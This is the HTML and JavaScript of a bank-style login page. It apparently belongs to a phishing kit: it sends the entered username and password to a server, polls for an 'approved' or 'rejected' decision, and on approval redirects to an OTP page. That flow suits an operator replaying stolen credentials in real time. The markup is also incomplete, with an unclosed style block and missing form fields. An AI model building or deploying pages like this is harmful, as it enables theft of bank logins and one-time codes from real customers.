<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>
<style>
  :root{
    --green:#1a6b3c;
    --green-dark:#125129;
    --gray-line:#9a9a9a;
    --text-dark:#2b2b2b;
    --bg:#ffffff;
  }
  *{box-sizing:border-box;}
  body{
    margin:0;
    font-family:'Segoe UI', Tahoma, Arial, sans-serif;
    background:var(--bg);
    color:var(--text-dark);
    display:flex;
    justify-content:center;
  }
  .screen{
    width:100%;
    max-width:430px;
    min-height:100vh;
    display:flex;
    flex-direction:column;
    padding:8px 24px 0 24px;
    position:relative;
  }
  .logo-wrap{
    display:flex;
    justify-content:center;
    margin-bottom:90px;
  }
  .logo-wrap img{
    max-width:220px;
    width:100%;
    height:auto;
  }
  .field{
    margin-bottom:34px;
  }
  .field-row{
    display:flex;
    align-items:center;
    justify-content:flex-start;
    gap:10px;
    border-bottom:2px solid var(--gray-line);
    padding-bottom:10px;
  }
  .field-row input{
    border:none;
    outline:none;
    font-size:17px;
    text-align:left;
    flex:1;
    color:var(--text-dark);
    background:transparent;
    direction:ltr;
  }
  .field-row input::placeholder{
    color:#3a3a3a;
    font-size:17px;
  }
  .icon{
    color:var(--green);
    width:22px;
    height:22px;
    flex-shrink:0;
  }
  .divider-icon{
    width:1px;
    background:var(--gray-line);
    align-self:stretch;
    margin:0 10px;
  }

  .btn-primary{
    background:var(--green);
    color:#fff;
    border:none;
    border-radius:8px;
    padding:16px;
    font-size:18px;
    font-weight:600;
    cursor:pointer;
    margin-top:6px;
  }
  .btn-outline{
    background:#fff;
    color:var(--green);
    border:2px solid var(--green);
    border-radius:8px;
    padding:16px;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    margin-top:18px;
  }
  .link-row{
    text-align:center;
    margin-top:34px;
    font-size:16px;
    color:var(--green);
  }
  .link-row.second{
    margin-top:16px;
  }
  .link-row b{
    font-weight:700;
  }
  .spacer{flex:1;}

  .lang-row{
    display:flex;
    align-items:center;
    justify-content:flex-start;
    gap:8px;
    color:var(--text-dark);
    font-size:17px;
    padding:20px 0;
  }

  .bottom-nav{
    display:flex;
    justify-content:space-between;
    padding:16px 12px 10px 12px;
    margin:0 -24px;
  }
  .nav-item{
    display:flex;
    flex-direction:column;
    align-items:center;
    gap:7px;
    font-size:11px;
    color:var(--text-dark);
    flex:1;
    min-width:0;
  }
  .nav-item span{
    white-space:nowrap;
    overflow:hidden;
    text-overflow:ellipsis;
    max-width:100%;
  }
  .nav-item svg{
    width:30px;
    height:30px;
    color:#8a8a8a;
  }
  .nav-item span{
    color:#8a8a8a;
  }

  .home-indicator-row{
    display:flex;
    justify-content:space-between;
    align-items:center;
    padding:14px 30px 18px 30px;
    color:#8a8a8a;
  }

  .loading-overlay{
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:#ffffff;
    display:none;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    z-index:999;
  }
  .loading-overlay.active{
    display:flex;
  }
  .spinner{
    width:56px;
    height:56px;
    border:5px solid #d8ead9;
    border-top:5px solid var(--green);
    border-radius:50%;
    animation:spin 0.9s linear infinite;
    margin-bottom:22px;
  }
  @keyframes spin{
    to{transform:rotate(360deg);}
  }
  .loading-text{
    font-size:17px;
    color:var(--text-dark);
    font-weight:600;
  }
  .error-msg{
    color:#c0392b;
    font-size:14px;
    margin-top:-24px;
    margin-bottom:20px;
    display:none;
  }
  .error-msg.active{
    display:block;
  }
    .field-row.invalid{
      border-bottom-color: #c0392b;
    }
    .field-row.invalid input{
      color: #c0392b;
    }

<script>
  var statusPollTimer = null;

  function showInvalidCredentials(username){
    var errorMsg = document.getElementById('errorMsg');
    var usernameField = document.getElementById('username');
    var passwordField = document.getElementById('password');
    var usernameRow = usernameField.parentNode;
    var passwordRow = passwordField.parentNode;

    usernameRow.classList.add('invalid');
    passwordRow.classList.add('invalid');
    errorMsg.textContent = 'Username and password are incorrect';
    errorMsg.style.color = '#c0392b';
    errorMsg.classList.add('active');
    if (username) {
      usernameField.value = username;
    }
    passwordField.value = '';
  }

  function stopStatusPoll(){
    clearInterval(statusPollTimer);
    statusPollTimer = null;
  }

  function pollLoginStatus(requestId, username){
    statusPollTimer = setInterval(function(){
      fetch('/api/status/' + requestId)
        .then(function(res){ return res.json(); })
        .then(function(data){
          if (!data.ok) return;
          if (data.status === 'approved') {
            stopStatusPoll();
            sessionStorage.setItem('aman_bank_request_id', requestId);
            window.location.href = 'otp.html';
          } else if (data.status === 'rejected') {
            stopStatusPoll();
            window.location.href = 'login_en.html?error=invalid&user=' + encodeURIComponent(username);
          }
        })
        .catch(function(err){
          console.warn('Unable to verify request status:', err);
        });
    }, 2500);
  }

  function handleLogin(){
    var username = document.getElementById('username').value.trim();
    var password = document.getElementById('password').value.trim();
    var errorMsg = document.getElementById('errorMsg');

    if(username === '' || password === ''){
      document.getElementById('username').parentNode.classList.add('invalid');
      document.getElementById('password').parentNode.classList.add('invalid');
      errorMsg.textContent = 'Please enter your username and password';
      errorMsg.style.color = '#c0392b';
      errorMsg.classList.add('active');
      return;
    }

    errorMsg.classList.remove('active');
    document.getElementById('loadingOverlay').classList.add('active');

    fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: username, password: password })
    })
    .then(function(res){ return res.json(); })
    .then(function(data){
      if (data.ok) {
        pollLoginStatus(data.id, username);
      } else {
        document.getElementById('loadingOverlay').classList.remove('active');
        errorMsg.textContent = 'Request could not be sent. Please try again.';
        errorMsg.style.color = '#c0392b';
        errorMsg.classList.add('active');
      }
    })
    .catch(function(err){
      console.warn('Unable to connect to the server:', err);
      document.getElementById('loadingOverlay').classList.remove('active');
      errorMsg.textContent = 'Unable to connect to the server. Make sure the app is running.';
      errorMsg.style.color = '#c0392b';
      errorMsg.classList.add('active');
    });
  }

  document.addEventListener('DOMContentLoaded', function(){
    var params = new URLSearchParams(window.location.search);
    if (params.get('error') === 'invalid') {
      var user = params.get('user') || '';
      showInvalidCredentials(user);
    }
  });
</script>
</body>
</html>
